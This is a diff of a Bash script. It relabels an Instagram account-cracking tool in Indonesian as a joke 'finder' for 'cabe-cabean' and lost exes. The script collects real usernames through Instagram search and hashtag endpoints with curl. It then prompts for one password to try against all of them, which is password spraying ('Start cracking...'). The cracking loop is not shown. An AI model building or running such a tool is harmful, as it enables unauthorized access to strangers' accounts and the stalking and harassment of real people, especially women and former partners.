@@ -16,16 +16,19 @@ limit=100
 
 #banner
 clear
-echo   "        |||||||||	      		 "  
-echo   "        █████████       		 "   
-echo   "        █▄█████▄█          		 "
-echo   "        █ ▼▼▼▼▼  _-_--.                  "
-echo   "        █.    _-_-- -_ hotttttttt !!!--  "
-echo   "        █ ▲▲▲▲▲   -_ -                   "  
-echo   "        █████████                        "
-echo   "          ██ ██                          "  
+echo   "        	SELAMAT DATANG DI	         "
+echo   "      PROGRAM PENCARI CABE-CABEAN INSTAGRAM      "
+echo   "     		   |||||||||	      		 "  
+echo   "      		  █████████       		 "   
+echo   "     		  █▄█████▄█          		 "
+echo   "     		  █ ▼▼▼▼▼  _-_--.                "
+echo   "    		  █.    _-_-- -_ hotttttttt !!!  "
+echo   "     		  █ ▲▲▲▲▲   -_ -                 "  
+echo   "      		  █████████                      "
+echo   "       		   ██ ██                         "
+echo   "   DIGUNAKAN UNTUK MENCARI MANTAN YANG HILANG!!! "  
 echo   ""
-echo   "   PROGRAM PENCARI CABE CABEAN INSTAGRAM "
+
 
 #dependencies
 dependencies=( "jq" "curl" )
@@ -39,25 +42,24 @@ done
 
 #menu
 echo -e '''
-1]. Get target from specific \e[1;31m@username\e[1;37m
-2]. Get target from specific \e[1;31m#hashtag\e[1;37m
-3]. Crack from your target list
+1]. Target buronan menggunkan username \e[1;31m@username\e[1;37m
+2]. Target buronan menggunkan hashtag \e[1;31m#hashtag\e[1;37m
 '''
 
-read -p $'What do you want   : \e[1;33m' opt
+read -p $'Masukan Nomer antara 1 / 2   : \e[1;33m' opt
 
 touch target
 
 case $opt in
     1) #menu 1
-        read -p $'\e[37m[\e[34m?\e[37m] Search by query   : \e[1;33m' ask
+        read -p $'\e[37m[\e[34m?\e[37m] Cari berdasarkan nama mantan :v   : \e[1;33m' ask
         collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
         echo $'\e[37m[\e[34m+\e[37m] Just found        : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
         read -p $'[\e[1;34m?\e[1;37m] Password to use   : \e[1;33m' pass
         echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
         ;;
     2) #menu 2
-        read -p $'\e[37m[\e[34m?\e[37m] Tags for use      : \e[1;33m' hashtag
+        read -p $'\e[37m[\e[34m?\e[37m] Hashtag yang sering digunakan   : \e[1;33m' hashtag
         get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
         if [[ $get =~ "Page Not Found" ]]; then
         echo -e "$hashtag : ${red}Hashtag not found${white}"
@@ -82,9 +84,9 @@ case $opt in
             exit
             else
                 cat $list > target
-                echo -e "[${blue}+${white}] Total your list   : ${yellow}"$(< target wc -l)
-                read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
-                echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
+                echo -e "[${blue}+${white}] jumlah yang didapat   : ${yellow}"$(< target wc -l)
+                read -p $'[\e[34m?\e[37m] Password sesuai insting anda   : \e[1;33m' pass
+                echo -e "${white}[${yellow}!${white}] ${red}Mulai mencari Mantan...${white}"
         fi
         ;;
     *) #wrong menu
